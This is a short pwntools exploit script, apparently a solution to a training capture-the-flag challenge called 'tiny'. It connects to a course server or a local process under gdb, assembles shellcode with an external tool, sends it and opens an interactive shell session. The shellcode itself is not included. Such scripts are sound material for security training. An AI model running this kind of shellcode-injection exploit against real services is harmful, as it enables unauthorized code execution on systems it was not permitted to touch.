from pwn import *
import time
import subprocess
import sys

context.terminal = ['tmux', 'splitw', '-h']

if args["REMOTE"]:
    r = remote("bin.training.offdef.it", 4101)
else:
    r = process("./tiny")
    gdb.attach(r, """
    # b *0x40000
    unset env
    c
    """)

input("wait")
time.sleep(0.5)

bin_shellcode = b""
command = "genbin ~/challenges/tools/shellcodes/tiny.asm"
try:
    bin_shellcode = bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
except (subprocess.CalledProcessError, ValueError) as e:
    print(f"An exception occurred: {e}")
    exit(-1)

r.send(bin_shellcode)

r.interactive()

